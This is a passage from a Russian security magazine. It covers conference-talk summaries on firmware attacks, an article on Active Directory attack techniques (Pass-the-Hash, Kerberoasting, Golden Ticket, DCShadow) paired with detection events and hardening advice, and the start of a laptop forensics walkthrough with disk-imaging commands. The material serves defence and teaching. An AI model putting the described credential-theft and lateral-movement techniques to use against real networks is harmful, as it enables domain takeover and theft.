сведений, относящихся  к безопасности. Используя  сегментацию изоб‐
ражений, иссле дователи добились того, что их фреймворк обнаруживает
более 65% компонен тов печатной платы.
  Кроме того, на 85% удалось сократить количество требуемых перетас‐
киваний мышью (при идентификации нес кольких экземпляров компонентов,
которые не удалось обнаружить автоматически этим софтом). Также раз‐
работана эффектив ная система абстрагирования, благодаря которой из тех‐
нической документации получается с высокой точностью отсеивать ненужную
информацию. Кроме того, представленный фреймворк хранит извлеченную
информацию структуриро ванным образом, что помогает аналитику избежать
путаницы и ошибок.
   Вся полученная информация комфортно размеща ется в базе данных, что
облегчает обмен информацией между незави симыми аналитиками, коман‐
дами или клиентами. Согласись, стоящая вещь для хардварного хакера,
с которой точно стоит познакомиться поб лиже.





ВЗЛОМ СОВРЕМЕННОЙ ОСЕВОЙ ЗАЩИТЫ ПОСРЕДСТВОМ АТАК
НА ПРОШИВКУ
Fractured Backbone: Breaking Modern OS Defenses With Firmware
Attacks // Black Hat. 2017
  В этом докладе представлены две новые тенденции.
  Первая тенденция: нарастающая угроза атак на прошивку, в том числе EFI‐
импланты для Mac, информацию о которых недавно опуб ликовала WikiLeaks
в своей грандиозной подборке Vault7. В докладе подробно опи саны уяз‐
вимости системной прошивки (в том числе UEFI, Mac’овская EFI, Coreboot)
и  атаки,  которые  эксплуатируют  эти  уяз вимос ти. Подчеркивается,  что
при наличии таких серьезных изъянов даже новичку не сос тавит труда внед‐
рить в прошив ку скрытый и неустра нимый имплант. Докладчик также пред‐
ставляет несколько авторских методик для обна ружения аномалий в прошив‐
ке, на основе open source фреймворка CHIPSEC.
   Вторая тенденция: современные ОС начали оснащаться более мощным
механизмом защиты софта на осно ве технологии виртуализации. Так, в Win‐
dows 10 реализована VBS‐защита (Virtualization Based Security — защита
на основе виртуализации), которая обеспечивает изолированную среду
выпол нения, на основе гипервизора. VBS‐защита применяется для выпол‐
нения критичных компонентов ОС и для защиты конфиденциальных данных,
таких как учетные записи для вхо да в систему. Докладчик подробно объясня‐
ет, как посредством экс плуатации уязвимостей прошивки злоумышленник
может подчинить себе гипервизор. Докладчик демонс трирует описываемую
методику на примере атаки против VBS‐подсистемы Windows 10, в ходе
которой удается извлечь учетные записи, защищенные механизмом Creden‐
tial Guard.
ВЗЛОМ
ПОГРУЖЕНИЕ
          РАЗБИРАЕМ АТАКИ НА
   MICROSOFT ACTIVE DIRECTORY:
     ТЕХНИКИ ПРОНИКНОВЕНИЯ                 И ДЕТЕКТА В AD





                                                                              Антон Тюрин
                                                                                     Руководитель отдела
                                                                                  экспертных сервисов, Posi‐
                                                                                                                     tive Technologies
                                                                                              atyurin@ptsecurity.com





За последние четыре года ни один Black Hat или DEF CON
не обошелся без докладов на тему атак на Microsoft Active
Directory. Учас тники рассказыва ют о новых векторах и своих
изобретениях, но не забывают и о советах, как можно их
обнаружить и предотвратить. В этой статье мы рассмотрим
популярные способы атак на AD и приведем рекомендации,
которые помогут от них защититься.


ШЕСТЬ АТАК НА AD, КОТОРЫЕ НЕЛЬЗЯ НЕ ЗАМЕТИТЬ
Многие производители программно го обеспечения для мониторинга ИБ уже
поддерживают в своих продуктах разнообразные техники атак злоумыш‐
ленников. Рассмотрим некоторые из них.


Pass-the-Hash
Эта техника возможна благодаря архи тек турным особенностям протокола
аутентификации NTLM, разработанного Microsoft в девяностых годах прош‐
лого века. Для того чтобы залогиниться на удаленном хосте, используется
хеш пароля, хранящийся в памяти компь юте ра, с которого происходит аутен‐
тификация. Соответственно, его оттуда мож но извлечь.


Mimikatz
Для удобной эксплуатации Pass‐the‐Hash француз ский исследователь Бен‐
жамен Делпи (Benjamin Delpy) в 2014 году разработал утилиту mimikatz. Она
позволяет дампить из памяти clear‐text‐пароли и NTLM‐хеши.


Brute Force
Если злоумышленнику недос таточно тех учетных данных, которые он извлек
с одного хоста, он может прибегнуть к грубой, но действенной технике под‐
бора паролей.


net user /domain
Откуда взять словарь имен пользователей для того, чтобы провес ти атаку
Brute  Force?  Любому  члену  домена  дос тупно  выпол нение  команды
net user /domain , которая возвра щает полный список имен пользовате лей
из AD.


Kerberoasting
Если же в домене в качестве протоко ла аутентификации используется Ker‐
beros, то злоумышленник может прибег нуть к атаке Kerberoasting. Любой
аутентифицированный в домене пользователь может запросить Kerberos‐
билет для доступа к сервису (Ticket Granting Service). TGS зашифрован хешем
пароля учетной записи, от которой запущен целевой сервис. Злоумыш‐
ленник, получив таким обра зом TGS, теперь может расшифровать его, под‐
бирая пароль и не боясь блокировки, поскольку делает это офлайн. В слу чае
успеха он получает пароль от ассоцииро ванной с сервисом учетной записи,
которая зачастую бывает привилегиро ванной.


PsExec
После того как зло умышленник получил нуж ные учетные данные, перед ним
встает задача удаленного исполнения команд. Для этого отлично подходит
утилита PsExec из набора Sysinternals. Она хорошо себя зарекомендовала
как среди IT‐администраторов, так и среди ата кующих.


СЕМЬ ЗАКЛИНАНИЙ АТАКУЮЩИХ ДЛЯ ЗАХВАТА ACTIVE
DIRECTORY
Сейчас мы переходим к семи заклинаниям, бла годаря которым атакующие
могут получить полный контроль над Active Directory. Раз делим их на четыре
стадии:
 1. Разведка.
 2. Продвижение по AD.
 3. Эксплуатация.
 4. Захват домена.

На схеме можно увидеть все четыре, а также техники, которые на них при‐
меняются. Рассмотрим каждую детально.





       Семь заклинаний атакующих, раз делен ные на четыре стадии


Стадия 1. Раз ведка

Начнем с разведки.


PowerView
Этот инструмент входит в популярный PowerShell‐фреймворк для проведения
тестирований на проникновение — PowerSploit. Также на него опирается инс‐
трумент BloodHound, стро ящий граф свя зей объектов внутри AD.





                Граф свя зей объектов Active Directory

BloodHound сразу предоставляет такие воз можнос ти:
 • найти аккаунты всех доменных администра торов;
 • найти хосты, на которых залогинены доменные адми нистраторы;
 • построить кратчайший путь от хоста атакующего до хоста с сессией
   доменного админа.

Последний пункт дает ответ на воп рос, какие хосты нужно взломать ата‐
кующему, чтобы доб раться до учетки доменного админа. Такой подход силь‐
но сокращает время на получение полного контроля над доменом.
   PowerView отличает от встроенных утилит для получения данных об объ‐
ектах AD (например, net.exe) то, что он работа ет по протоколу LDAP, а не
SAMR. Для обнаружения этой активности подой дет событие 1644 с контрол‐
лера домена. Логирование данного события вклю чается добавлением соот‐
ветствующе го значения в реес тре:


HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostic\
\15 Field Engineering = 5





               Включение логирования LDAP Event 1644





            Событие 1644 с параметрами LDAP‐запроса

Стоит обратить внимание на то, что таких событий может быть довольно мно‐
го, и хорошей альтернативой детекту по событию будет детект по трафику,
поскольку LDAP — это clear‐text‐протокол, соответственно, все запросы
в трафике отлично видны.





                      LDAP SearchRequest

Еще одна важная особенность это го фреймворка — он написан на чистом
PowerShell и не имеет зависимостей. И здесь для детектирования нам
поможет появившаяся в PowerShell версии 5 возможность рас ширенного
аудита. Событие 4104 показывает тело скрипта, в котором мы можем поис‐
кать характерные для PowerView наз вания функций.





SPN Scan
Эта техника может заменить ата кующему запуск Nmap. После того как ата‐
кующий разобрался, какие пользователи и группы есть внутри AD, для пол‐
ноты картины ему понадобится информация, какие есть сервисы.





Обычно это решается сканированием портов утилитой Nmap. Но теперь эту
информацию можно получить и из AD — она там хра нится в виде так называ‐
емых SPN (Service Principal Names). SPN сос тоит из serviceclass, он уникален
для каждого типа сервиса, затем идет hostname в форме FQDN и для некото‐
рых сервисов — port.





                        Примеры SPN


        WWW

                     •Полный список Service Principal Names



Обнаружить SPN Scan также поможет аудит событий LDAP.
  Важно отметить, что SPN scan имеет явное преимущество перед сканом
Nmap: он менее шумный. При использовании Nmap тебе нужно подключаться
к каждому узлу и отправлять сотни пакетов на тот диапазон портов, который
ты указал. А для получения списка SPN нужно отпра вить все го один запрос.


Remote Sessions Enumeration
Важной задачей перед атакующим на этапе  lateral movement становится
определение, какой пользователь на какой машине залогинен. Либо у него
уже есть учетные данные пользователя (хеш или Kerberos‐тикет) и он ищет
хосты, куда можно беспрепятс твенно залоги ниться. Либо он в поисках хоста,
где есть живая сессия доменного администра тора.
   Тогда срабатывает сценарий: охота → компро метация любого хоста →
залив mimikatz → профит.
   Для обнаружения дан ной техники можно использовать два события.
4624 — это успешный логон на удален ной системе с логон тайпом 3, а также
события доступа к сетевой шаре IPC$, и нюанс: наз вание пайпа — srvsvc.
Почему пайп так называется, можно понять из трафика.





В левой части в красных рамках обра щения к SMB, затем обращения к пай‐
пу — srvsvc. Вот этот пайп позволяет взаимодей ствовать по специальному
протоколу Server Service Remote Protocol. Конечным хостам он поз воляет
получать от него различную админис тративную информацию, в том числе
среди запросов есть такой, который называ ется NetSessEnum. В результате
этого запроса возвращает ся полный спи сок залогиненных на удаленной сис‐
теме пользователей с IP и именами пользователей.


             INFO

                   В MaxPatrol SIEM мы сделали детект на основе
                        связки этих двух событий с учетом srvsvc. И ана‐
                        логичный детект по трафику в PT Network Attack
                           Discovery.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
                AD    ПОГРУЖЕНИЕ В
                           РАЗБИРАЕМ АТАКИ НА
                     MICROSOFT ACTIVE DIRECTORY:
               ТЕХНИКИ ПРОНИКНОВЕНИЯ И ДЕТЕКТА





Стадия 2. Прод вижение по AD

Overpass-the-Hash
Реинкарнация Pass‐the‐Hash. Что атакующий может сделать, если у него есть
NTLM‐хеш? Он может провес ти ата ку Pass‐the‐Hash — но на нее уже есть
детекты. Поэтому был найден новый вектор — ата ка Overpass‐the‐Hash.
  Протокол Kerberos был раз работан специально для того, чтобы пароли
пользователей в том или ином виде не переда вались по сети. Для этого
на своей машине пользователь хешем сво его пароля шифрует запрос
на аутентификацию. В ответ Key Distribution Center (специальная служба,
которая хос тится на контроллере домена) выда ет ему билет на получение
других билетов — так называемый Ticket‐Granting Ticket (TGT). Теперь клиент
считается аутентифици рованным, и в течение десяти часов он может обра‐
щаться за билетами для доступа к другим сервисам. Соответс твенно, если
атакующий сдампил хеш пользователя, который входит в доверенную группу
интересующе го его сервиса, например ERP‐системы или базы данных, ата‐
кующий может выпустить пропуск для себя и успешно авторизоваться на этом
сервисе.





Как детек тить. Если ата кующий использует PowerShell‐версию mimikatz
для этой атаки, то здесь на помощь при ходит логирование тела скрипта,
потому что «Invoke‐Mimikatz» — весь ма примечательная строчка.





Или же 4688 — событие запус ка процесса с расширенным аудитом коман‐
дной строки. Даже если бинарь будет переименован, то по командной строке
мы обнаружим очень характерную для mimikatz команду.





По трафику Overpass‐the‐Hash можно детектить на основе аномалии, которая
возникает в результате того, что Microsoft рекомендует для текущих доменов
использовать для шифрования authentication request AES‐256. А mimikatz, ког‐
да отправ ляет данные authentication request, шифрует их с помощью устарев‐
шего RC4.





В трафике наблюдается еще одно отличие из‐за осо бенностей mimikatz. Оно
основано на разнице набора шифров в легитимном домене и том, что
отправляет mimikatz.


Golden Ticket
Что атакующий может сделать, если у него есть хеш пароля специальной
учетной записи, которая называется krbtgt? Ранее мы рассматривали случай,
когда пользователь мог быть неп ривилегированным. Сейчас мы рассмат‐
риваем пользователя, хешем пароля которо го подписываются абсолютно все
билеты на получение дру гих билетов (TGT). Соответс твенно, злоумышленник
больше не обращается к Key Distribution Center, он сам у себя генерирует этот
билет, поскольку Golden Ticket, по сути, и есть TGT. Затем он уже может
отправлять запросы на аутентифика цию на любом сервисе внутри AD, причем
на неограниченное время. В итоге он бес препятс твенно обращается к этому
ресурсу — Golden Ticket неспроста называ ется золотым.





Как детек тить по событиям. Существует событие 4768, говорящее о том,
что был выдан TGT, и событие 4769, говоря щее о том, что был выдан сер‐
висный билет, который необходим для аутентифика ции на каком‐то сервисе
внутри AD.





Здесь мы можем играть на разнице: так как при ата ке Golden Ticket не зап‐
рашивает TGT у контроллера домена (он генерирует его самостоятельно),
а TGS ему запрашивать необходимо, то, если мы обнаруживаем разницу
в полученных TGT и TGS, можем предположить, что происходит атака Golden
Ticket.


             INFO

                   В MaxPatrol SIEM с использованием табличных
                       списков, в которых мы логируем все выданные
                     TGT и  TGS, нам  удалось  реализовать  такой
                          детект.



Стадия 3. Эксплу атация

После того как задача аутентифика ции и авториза ции на желаемых хостах
решена, атакующий может приступить к выполнению задач удаленно.


WMI Remote Execution
WMI — встроенный механизм для уда лен ного исполне ния, он отлично под‐
ходит для задач злоумышленника. Последние несколько лет в тренде понятие
living oﬀ the land («жить с земли»), что озна чает пользоваться встроенны ми
в Windows механизмами. В первую очередь потому, что позволя ет мас‐
кироваться под легитимную активность.





На скриншоте — использование встроенной утилиты wmic. Ей указывается
адрес хоста, к которому нужно подключиться, учетные данные, оператор
process call create и команда, которую необходимо выполнить на удаленном
хосте.
  Как детек тить. По связ ке событий уда лен ного логона 4624 (обрати вни‐
мание на Logon ID) и событию 4688, говоря щему о запуске процесса с com‐
mand line. 4688 — можно увидеть, что родитель запус каемого процесса —
WmiPrvSE.exe, специальный сервисный процесс WMI, который используется
для удаленного админис трирова ния. Видна команда, которую мы отправляли
net user /add, и Logon ID совпадает с событием 4624. Соответственно, мы
можем совершенно точно сказать, с какого хоста запущена данная команда.





Детект по трафику. Здесь мы явно видим характерные слова Win32 process
create, а также command line, которая отправляется на запуск. На скрин‐
шоте — недавно встреченная нами мал варь, которая распространялась
в виртуальных сетях по прин ципу, схожему с WannaCry, только вмес то шиф‐
рования файлов она устанавливала майнер. Малварь несла с собой mimikatz
и EthernalBlue, она дампила учет ки, с их помощью логини лась на все те хос ты,
до которых могла дотянуться по сети. С помощью WMI она запускала на них
PowerShell, скачивала PowerShell payload, который опять же содержал в себе
mimikatz, EthernalBlue и майнер. Таким обра зом получалась цепная реакция.





                     1–3Рекомен дации к ста диям
 1. Сложные и длинные (>25 символов) пароли для сервисных учетных
   записей. Это не оставит злоумыш леннику шанса провес ти атаку Ker‐
   beroasting, так как бру тить придется очень долго.
 2. Логирование PowerShell. Поможет обна ружить использование многих сов‐
  ременных инструментов для атак на AD.
 3. Переезд на Windows 10, Windows Server 2016. Microsoft создала Credential
   Guard: больше не удастся сдампить из памяти NTLM‐хеши и билеты
   Kerberos.
 4. Строгое разграничение ролей. Опас но сочетать в одной роли адми нис‐
   тратора AD, DC, всех серверов и рабочих машин.
 5. Двойная смена пароля krbtgt (это та самая учетная запись, которой под‐
   писываются TGT‐билеты). Каждый год. И пос ле ухода админис тратора AD:

    • менять нужно дваж ды, так как хранится текущий и предыдущий пароль;
    • менять каждый год, а также после ухо да доменного администратора.
     Даже если сеть уже скомпромети рова на и злоумышленни ки выпус тили
     Golden Ticket, изменение пароля делает этот Ticket бес полезным. И им
     снова нужно начинать все сначала.

 6. Средства защиты с непрерывно обновляющейся экспертной базой зна‐
   ний. Необходимо для обна ружения реальных актуальных атак.




Стадия 4. Захват домена

DCShadow
24 января 2018 года на конференции Microsoft BlueHat в Израиле Бенджамен
Делпи и Венсан ле Ту (Vincent Le Toux) представили новый модуль mimikatz,
который реализует атаку DCShadow. Суть атаки в том, что создается под дель‐
ный контроллер домена, чтобы изменять и создавать новые объ екты в AD
через репликацию. Исследователям удалось выделить минимальный набор
Kerberos SPN, необ ходимых для про хождения процесса репликации, — их
требуется всего лишь два. Кроме того, они представили специальную фун‐
кцию, которой можно запус кать репликацию контроллеров при нудительно.
Авторы атаки позиционируют ее как атаку, которая сделает твой SIEM сле‐
пым. Так как поддельный контроллер домена не отправляет события в SIEM,
это значит, что злоумышленники могут тво рить темные дела с AD и SIEM
об этом не узнает.





Схема атаки: на той системе, с которой про изво дится атака, необходимо
добавить два SPN, которые нужны, чтобы дру гие домен‐контрол леры могли
аутентифицироваться по Kerberos для реп ликации. Пос кольку согласно спе‐
цификации контрол лер домена представлен в базе AD объ ектом клас са
nTDSDSA, необходимо такой объект создать. И в завершение вызвать реп‐
ликацию с помощью функции DRSReplicaAdd.
  Как детек тить. Каким образом DCShadow выглядит в трафике. По тра‐
фику мы отчетливо видим добавление нового объекта в схе му конфигурации
типа домен‐контрол лер, а затем принудительный запуск репликации.





Хотя авторы атаки и говорят, что SIEM обна ружить ее не поможет, мы нашли
способ, как можно дать понять служ бе ИБ, что в сети подоз рительная
активность.
   Благодаря  тому  что  наша  корреляция  знает  список  легитимных
домен‐контроллеров, она будет срабатывать, когда произойдет репликация
с домен‐контроллера, не входящего в этот белый список. Соответственно,
подразделение  ИБ  может  провести  расследование  и  уже  понять,
это легитимный домен‐контроллер, который добавила ИТ‐служба, или атака
DCShadow.


ЗАКЛЮЧЕНИЕ
Пример DCShadow показывает, что появляются новые векторы атак на пред‐
приятия. В этом океане ИБ‐событий очень важно оставаться на гребне вол‐
ны: смотреть дальше и двигаться быстро. Мы в PT Expert Security Center
исследуем новые угрозы и раз рабатываем для них способы и инстру менты
обнаружения. И готовы делить ся этой информа цией и дальше. :)
ВЗЛОМ


ТАЙНА
 КАЗНАЧЕЙСКОГО НОУТБУКА

      ИСПОЛЬЗУЕМ ФОРЕНЗИКУ,
     ЧТОБЫ РАСКРЫТЬ ОГРАБЛЕНИЕ





Сегодня нас ждет по‐настоящему инте рес‐
ная и актуальная задача, а точнее — целое
расследование из серии «куда ушли боль‐
шие деньги»: мы рассмотрим кейс с кор‐
поративным ноутбуком на Windows 10, став‐          Иван Пискунов
ший  жертвой  атаки  кибермошен ников.
А может быть, сот рудники компании просто
присвоили деньги, сославшись на «злых
хакеров»? Скоро узна ем. Вперед, на поис‐
ки истины!


             INFO

                     Другие статьи по форен зике:
                    •Искусство форен зики. Теория, книги, курсы,
                         полезные материалы
                    •Искусство форен зики. Находим источники дан‐
                          ных, ищем и анализируем артефакты



ПРЕДЫСТОРИЯ ИНЦИДЕНТА
Итак, перед нами ноутбук с уста новленной на борту Windows 10, который вхо‐
дил в корпоративный домен и использовался как основная рабочая машина
сотрудника. Помимо этого, его могли брать в командировку, поработать
домой и вне основного офиса (то есть в наличии VPN или другие коннекты
к корпоративному перимет ру).
   У пользователя по умол чанию отсутствовали локальные права админис‐
тратора, форсированы доменные политики безопасности (парольная полити‐
ка, шифрование томов BitLocker, включен встроенный файрвол, активирован
UAC), установлен AV одного из известных рос сийских вендоров и без огра‐
ничений предоставлен доступ в интернет. Компьютер принадлежал казначею,
одной из главных задач которого были составление и проведе ние финан‐
совых платежных документов (транзакций в ДБО).
  Организация, которой принадлежал ноутбук, выявила у себя несанкци они‐
рованное проведение пла тежей в ДБО одного из подключенных банков, при‐
чем все операции были выполнены от име ни легитимных пользователей
(финансового директора и главного бухгалтера). Круглые денежные суммы
переведены на неизвес тные счета треть их лиц в иностранные банки. Сис‐
темы безопасности организации не зафиксирова ли на тот момент никакой
подозрительной активнос ти (промолчали IDS/IPS‐сис темы и SEIM‐коннектор,
подклю ченный к ERP‐модулям, AV и WAF).
  Предполагается, что зло умышленники взломали ноутбук удаленно по сети
или с получением физичес кого дос тупа к нему либо это сговор уполномочен‐
ных лиц и мошенничество, свя занное с инсайдерами. Вот со всем этим мы
и будем сегодня разбирать ся.


           WARNING

                       Всегда ясно и четко осознавай, какое именно
                      действие и для какой цели ты совершаешь. Неп‐
                       равильное использование приведенных в тексте
                         статьи  программ  может  привести  к  потере
                    информации   (арте фак тов)   или   искажению
                       полученных дан ных (криминалистических доказа‐
                         тельств). Ни автор, ни редак ция не несет ответс‐
                        твенности за любой ущерб, причиненный из‐за
                      неп равильного использования материалов дан‐
                      ной статьи.



Гипоте зы
Начнем распутывать этот клубок событий. Все, что мы имеем в самом
начале, — это информация, описанная выше, плюс сам ноутбук, который,
после того как обнаружилось мошенничество, был немедленно изъят у сот‐
рудника. Гипоте зы, в принципе, всего две: либо это внутренний сговор сот‐
рудников организации, выставивших все события и условия  так, чтобы
это выглядело внешним взло мом, либо это несанкционированный доступ
хакеров к ноутбуку. В первом случае мы сделаем акцент на поиске артефак‐
тов и, возможно, допущенной оплошнос ти, явно указывающих на сотрудника.
Во втором это обнаружение артефактов уда ленного взлома (отключение
средств защиты, использование экс пло итов и вредоносного ПО).
   Стоит сказать, что на ноутбуке уста новлены средства защиты, обес‐
печивающие неплохой базовый уровень безопасности. Это наводит на мысль
о компетенции взломщиков выше средней. Одна ко, как было отме чено, ноут
могли выносить за пределы офиса и включать вне действия домена, где кор‐
поративные средства защиты не работают. Таким образом, мы получаем рис‐
ки физического доступа к системе и воз можность снять дамп всех данных
на жестком диске (включая сохраненные пароли, ключи в реестре и подоб‐
ное), «перезалить» ОС и стереть следы прес тупления.


Уяз вимые места и поиск сце нария взло ма
Прежде чем мы приступим к форензик‐про цеду рам, еще нес колько ссы лок
на интересные материалы, которые дадут тебе пищу для размышле ния
и могут натолкнуть на «возможные сценарии» взлома:
 1. «Изучаем и вскрываем BitLocker. Как устроена защита дисков Windows
   и как ее взломать», а также новос ти о небезопасности BitLocker’а тут, тут
   и тут.
 2. «FUCK UAC! 10 способов обхода системы User Account Control в Windows»,
   а также новости о взло ме UAC.
 3. «Инъекция по‐черному. Обходим антивирусы при помощи Shellter», а так‐
  же обход с помощью Veil.
 4. Возможность взлома уда ленного подключения RDP с помощью Pass‐in‐
   the‐Hash, еще один вариант с Metasploit, а также новость о готовом экс‐
   плоите, утилита fuzzbunch и гайд по ней.
 5. Занимательные гайды по созданию PowerShell Payload и Metasploit Payload.
 6. Отчеты отечественного ресерчера — компании Positive Technology —
  о (без)опасности систем дистанционного банковского обслуживания: «Ки‐
  бербезопасность 2018», «Атаки на банки», «Новые атаки на банки».


ПОДГОТОВКА ЛАБОРАТОРИИ
Условно все опе рации по обнаружению и извлечению арте фактов, оставших‐
ся после взлома, можно раз делить на два боль ших типа. Это действия
с «энергозависимой памятью» — процес сы в RAM, сетевые коннекты
во внешний мир и так далее и работа с «энергонезависимой» — это HDD
и съемные носители, скрытые и уда лен ные фай лы, альтернативные NTFS‐
потоки, инсталлированное ПО, пропатченные системные библиоте ки и про‐
чее.
  Все форензик‐процедуры можно выполнить с применением различного
ПО, но мы, как правило, будем юзать два или три варианта наиболее ходовых
утилит. Многие из пред ставленных инс трументов open source либо свободно
распространяемые, другие же проприетарные, но тут ничего не поделаешь,
профессиональные паки специализиро ванных программ всегда будут стоить
денег.


Не кото рые осо бен ности форен зики в Windows 10
Со времени выхода Windows Vista мно гие техничес кие аспекты работы Win‐
dows (системный реестр, запись событий в журналы и другие) несколько
изменились. Вот почему руководства, описанные, к примеру, для Windows XP,
сейчас не работают на более поз дних релизах Windows. Что же говорить
про «десятку», на которую раз работчики постоянно выпускают Update packs.





       Наглядное сравнение изменений на примере Win 10 и Win 8.1

Итак, по сравнению со всеми остальными вер сиями ОС в «десятке» появи‐
лись  дополнительные  источники  данных,  которые  эксперт‐криминалист
может использовать для сбо ра артефактов:
 • Edge Browser — браузер, пришедший на смену IE;
 • Cortana — голосовой движок, призванный стать новым HMI по логике
   Microsoft;
 • OneDrive — облачное хра нилище, в том числе часто используемое
   для небольших бэкапов личных файлов и  как сторидж при ложе ний
   для мобильных устрой ств на базе Android;
 • Native Applications (Skype, Photo App, Webcam App) — приложе ния, «из
   коробки» доступные сра зу пос ле установки системы;
 • Notiﬁcation — системные оповещения из трея, где очень час то можно
   обнаружить сведения о программах, запущенных в режиме ожи дания,
   антивирусном ПО, оста новке брандма уэра и про чем;
 • Prefetch ﬁles — так сказать, кешированные фай лы для быс трого запус ка,
   эта фича присуща не только «десятке», но ее тоже отчасти можно привлечь
   для получения допол нительных кру пиц информа ции.

Стоит добавить, что пос ле выхода Windows 7 в продажу Microsoft составила
чек‐лист основных артефактов и их источников, которые могут использовать‐
ся различными экспертами, занимающимися раз бором инцидентов. Список
получил название Windows Jump Lists, и ты можешь посмотреть его для Win‐
dows 7 и для Windows 10.


        WWW

                    Полезные материалы об особенностях форензики
                        в Windows 10:
                  •Презентация Windows 10 Forensics , кратко опи‐
                        сывающая некото рые особенности сбора арте‐
                       фактов на 10‐й версии «окон»
                  •Книга Rhys P. J. Evans с названием Windows 10
                            Forensic Analysis
                  •Небольшая, но содержательная брошюра Win‐
                       dows 10 Forensics (Center for Digital Investiga‐
                                 tion)


Об щий чек‑лист про верки
Для поиска и сбора криминалистичес ких доказа тель ств мы будем проверять
следующие основные пункты на нашей системе:
 • оперативную память (системные и пользовательские процессы, внед‐
   ренные DLL, посторонние служ бы и запущенный вредоносный код);
 • жесткий диск (удален ные портации, размеченные области диска, стертые
  файлы, слепки теневых копий, «остатки» от корзины, ярлычки LNK и Notiﬁ‐
   cation, установленный софт, ска чанные фай лы и так далее);
 • сетевой стек (поднятые коннекты, откры тые порты, «неизвес тные» сер‐
   висы на портах, паразитный трафик с нашей машины);
 • системный реестр (инсталлированный и удаленный софт, временные
   ярлыки, ассоциации файлов и прочее);
 • системные журналы (запись таких событий, как логон, эскалация прав,
   доступ к директориям, изменение групповой политики, создание/уда‐
   ление учетки, сбой и перезагрузка);
 • файлы подкачки и гибернации (часть данных в этих файлах успешно сох‐
   раняется в неизменном виде);
 • данные приложений (Skype, OneDrive, Xbox), почта и браузе ры (история
  посеще ний, закладки, скачанные файлы, быть может, пассы).


Снимаем образ HDD-диска взло ман ной системы
Первым делом обязательно снимаем дамп всего содержимого жес ткого дис‐
ка нашего ноутбука. Во‐первых, это убережет тебя от косяков и случайных
повреждений (и, соот ветственно, утери части бес ценных артефактов), во‐вто‐
рых, будет служить эталоном сос тояния системы на момент получения аппа‐
ратуры на экспертизу, а  в‐треть их, поз волит  получить образ, готовый
к углубленному исследованию, но не требующий при этом физического дос‐
тупа к устройству. В первой нашей статье мы уже приводи ли примеры соф та,
который поможет нам спра виться с этой задачей. Сегод ня мы будем поль‐
зоваться утилитой The Forensic Toolkit Imager (FTK Imager).
   Программу можно ска чать с официального сайта или найти, к при меру,
в спе циализированных дистрибутивах DEFT или CAINE (Computer Aided INves‐
tigative Environment). Более подробную инфу о сня тии образа и дру гих дос‐
тупных утилитах для это го ты можешь прочесть в документе SANS Forensic Im‐
ages: For Your Viewing Pleasure. А для тех, у кого совсем туго с английским,
есть пошаговый гайд с картинками, где уже точно все будет понятно.
   Рассмотрим несколько вариантов работы с тулзой. Первый (CLI) и второй
(GUI) варианты на рабочей системе с заг рузкой хостовой ОС. Тре тий вари‐
ант — это более безопас ный спо соб создания обра за HDD на выключенной
машине, но о нем чуть поз же.
   Начнем с первого. Потрошим ноут, вытас киваем из него HDD, далее под‐
клю чаем его к нашему лабораторному компу  и, запустив в консольном
режиме FTK Imager, прописываем команды.





              Наш диск, который будем копировать

В CLI‐интерфейсе программы пишем:


E:\>ftkimager.exe <HARD DRIVE THAT YOU WANT TO IMAGE> e:\<Destin
ation path of output file with name NOT extension> ‐‐e01 ‐‐frag 2G
‐‐compress 9 ‐‐verify

В нашем случае это выглядит так:


E:\>ftkimager.exe \\.\PhysicalDrive0 e:\IMAGE_FORENSIC\filename
‐‐e01 ‐‐frag 2G ‐‐compress 9 ‐‐verify

Если все правильно, то в конце мы должны получить вот такую картинку.





     CLI‐окно программы FTK Imager в про цес се создания образа HDD

Лю бителям  графического  интерфейса  при дется  больше  двигаться.   :)
Для того чтобы создать образ диска, идем в пункт меню File → Create disk
image.





      Начало создания обра за HDD в GUI‐версии утилиты FTK Imager

Далее выбираем пункт «Физический диск».





           Выбор источника данных для соз дания образа

Если диск в системе не один, то выбира ем системный.





     Выбор системного диска в качестве источни ка создания образа

Не забываем поставить галочку «верифи кация» пос ле создания образа.





           Стартовое меню для запуска создания образа HDD

Меню выбора доступных форматов для сохранения образа диска нашего
ноутбука. Для совместимости с дру гим ПО выбираем дефолтный вариант —
E01.





      Выбор типа фор мата, в котором будет сохранен образ HDD





               Окно процесса создания обра за диска

И наконец, вариант третий — получение обра за без загрузки хостовой ОС
путем снятия дампа в режиме Live CD. Это наиболее безопас ный и пред‐
почтительный способ, так как нам не нуж но вмешиваться в существующую
конфигурацию системы (получать права админа, забивать ненужной инфой
системный лог), и, что более важно, это не поз волит уничтожить ни один арте‐
факт, оставшийся после взлома. К примеру, если использовалась малварь, то
она по таймеру или другому событию может замес ти следы своего присутс‐
твия в системе (очистить логи, %TEMP%‐директории, удалить свой исполня‐
емый файл), что может существенно изменить картину происходящего.
  Для этих целей используем специальный Linux‐дистрибутив CAINE. Все
действия будут выполняться в терминале. Подклю чаем внешний HDD‐диск
к нашему пациенту, а вместе с тем параллельно загружаемся с USB‐флешки
в CAINE. Монтируем внеш ний HDD (/dev/sdb1) во временную директорию:


root@caine:~# mkdir /mnt/target
root@caine:~# mount /dev/sdb1 /mnt/target

Далее создаем хеш‐значение жесткого диска ноутбука (/dev/sda), используя
алгоритм MD5:


root@caine:~# md5sum /dev/sda > /mnt/target/HDD_Img_Forensic.md5

Утилитой dd делаем дамп диска /dev/sda в директорию /mnt/target, задав имя
образа, к примеру HDD_Img_Forensic.


root@caine:~#dd if=/dev/sda of=/mnt/target/HDD_Img_Forensic.img
conv=sync,noerror bs=8k

И в завершение проводим верификацию получившегося образа по сумме
хеша MD5, таким образом заверяя себя, что все прошло успешно.


root@caine:~#md5sum /mnt/target/HDD_Img_Forensic.img > /mnt/target/
HDD_Img_Forensic.img.md5
root@caine:~# cat /mnt/target/*.md5

И перед выключением размонтируем нашу временную точку:


root@caine:~# umount /mnt/target/




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
             ТАЙНА
     КАЗНАЧЕЙСКОГО
           НОУТБУКА
                      ИСПОЛЬЗУЕМ ФОРЕНЗИКУ,
                   ЧТОБЫ РАСКРЫТЬ ОГРАБЛЕНИЕ





Соз даем дамп RAM иссле дуемо го ноутбука
После того как мы создали дамп жесткого диска, следует сделать аналогич‐
ный, но уже оперативной памяти, так как там можно найти очень много арте‐
фактов, особенно если дело  каса ется поис ка  следов инфицирования
или установки левого софта на машину. Для этого мы возьмем две тул зы —
